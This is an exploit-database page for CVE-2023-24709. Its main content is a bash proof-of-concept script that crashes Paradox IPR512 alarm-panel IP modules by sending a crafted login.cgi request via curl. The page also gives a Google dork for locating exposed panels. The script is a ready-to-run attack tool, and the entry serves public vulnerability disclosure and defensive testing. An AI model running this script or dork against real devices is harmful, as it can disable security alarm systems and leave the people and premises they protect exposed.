---
title: Paradox Security Systems IPR512 Denial Of Service
url: https://cxsecurity.com/issue/WLB-2023040035
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:29.248254
---

# Paradox Security Systems IPR512 Denial Of Service

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Paradox Security Systems IPR512 Denial Of Service** **2023.04.10**  Credit:  **[Giorgi Dograshvili](https://cxsecurity.com/author/Giorgi%2BDograshvili/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2023-24709](https://cxsecurity.com/cveshow/CVE-2023-24709/ "Click to see CVE-2023-24709")**  CWE: **N/A**  **[**Dork:** intitle:"ipr512 \* - login screen"](https://cxsecurity.com/dorks/)** | |

#!/bin/bash
# Exploit Title: Paradox Security Systems IPR512 - Denial Of Service
# Google Dork: intitle:"ipr512 \* - login screen"
# Date: 09-APR-2023
# Exploit Author: Giorgi Dograshvili
# Vendor Homepage: Paradox - Headquarters <https://www.paradox.com/Products/default.asp?PID=423> (https://www.paradox.com/Products/default.asp?PID=423)
# Version: IPR512
# CVE : CVE-2023-24709
# Function to display banner message
display\_banner() {
echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"
echo "\* \*"
echo "\* PoC CVE-2023-24709 \*"
echo "\* BE AWARE!!! RUNNING THE SCRIPT WILL MAKE \*"
echo "\* A DAMAGING IMPACT ON THE SERVICE FUNCTIONING! \*"
echo "\* by SlashXzerozero \*"
echo "\* \*"
echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"
}
# Call the function to display the banner
display\_banner
echo ""
echo ""
echo "Please enter a domain name or IP address with or without port"
read -p "(e.g. example.net or 192.168.12.34, or 192.168.56.78:999): " domain
# Step 2: Ask for user confirmation
read -p "This will DAMAGE the service. Do you still want it to proceed? (Y/n): " confirm
if [[ $confirm == "Y" || $confirm == "y" ]]; then
# Display loading animation
animation=("|" "/" "-" "\\")
index=0
while [[ $index -lt 10 ]]; do
echo -ne "Loading ${animation[index]} \r"
sleep 1
index=$((index + 1))
done
# Use curl to send HTTP GET request with custom headers and timeout
response=$(curl -i -s -k -X GET \
-H "Host: $domain" \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36" \
-H "Accept: \*/" \
-H "Referer: http://$domain/login.html" \
-H "Accept-Encoding: gzip, deflate" \
-H "Accept-Language: en-US,en;q=0.9" \
-H "Connection: close" \
--max-time 10 \
"http://$domain/login.cgi?log\_user=%3c%2f%73%63%72%69%70%74%3e&log\_passmd5=&r=3982")
# Check response for HTTP status code 200 and print result
if [[ $response == \*"HTTP/1.1 200 OK"\* ]]; then
echo -e "\nIt seems to be vulnerable! Please check the webpanel: http://$domain/login.html"
else
echo -e "\nShouldn't be vulnerable! Please check the webpanel: http://$domain/login.html"
fi
else
echo "The script is stopped!."
fi

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040035)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top